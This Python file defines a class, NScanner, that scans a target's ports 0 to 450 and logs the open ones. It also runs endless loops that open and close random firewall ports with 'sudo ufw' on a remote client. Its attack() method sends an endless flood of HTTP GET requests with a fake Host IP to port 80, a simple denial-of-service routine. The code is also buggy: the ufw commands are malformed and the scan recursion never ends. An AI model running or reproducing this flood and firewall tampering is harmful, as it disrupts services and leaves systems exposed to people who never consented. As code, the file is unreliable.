import socket
from random import randint

class NScanner:

    def __init__(self, client):
        self.client = client
        self.credentials = open('credentials.txt', 'r').read().split('\n')
        self.ip = self.credentials[0]
        self.openports = []
        
        self.target = self.ip
        self.fake_ip = '182.21.20.32'
        self.port = 80 
    
    def check_ports(self, start, end):
        if start == 450:
            start = 0
            end = 0
        portsfile = open('portslog.txt', 'a')
        for port in range(start,end):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.ip, port))
                if result == 0:
                    if port not in self.openports:
                        self.openports.append(port)
                        portsfile.write(str(port))
                else:
                    if port in self.openports:
                        with open('portslog.txt', 'r') as f:
                            lines = f.readlines()
                        with open('portslog.txt', 'w') as f:
                            for line in lines:
                                if line.strip('\n') != str(22):
                                    f.write(line)

                sock.close()
            except: pass
        portsfile.close()
        self.check_ports(start+10, end+10)

    def open_random_ports(self):
        while True:
            port = randint(0,450)
            if not port == 22:
                com = 'sudo ufw allow' + str(port)
                self.client.command(com)
                print('open '+str(port))

    def close_random_ports(self):
        while True:
            port = randint(0,450)
            if not port == 22:
                com = 'sudo ufw deny' + str(port)
                self.client.command(com)
                print('open '+str(port))

    attack_num = 0
    def attack(self):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self.target, self.port))
                s.sendto(("GET /" + self.target + " HTTP/1.1\r\n").encode('ascii'), (self.target, self.port))
                s.sendto(("Host: " + self.fake_ip + "\r\n\r\n").encode('ascii'), (self.target, self.port))
                s.close()
            except: pass
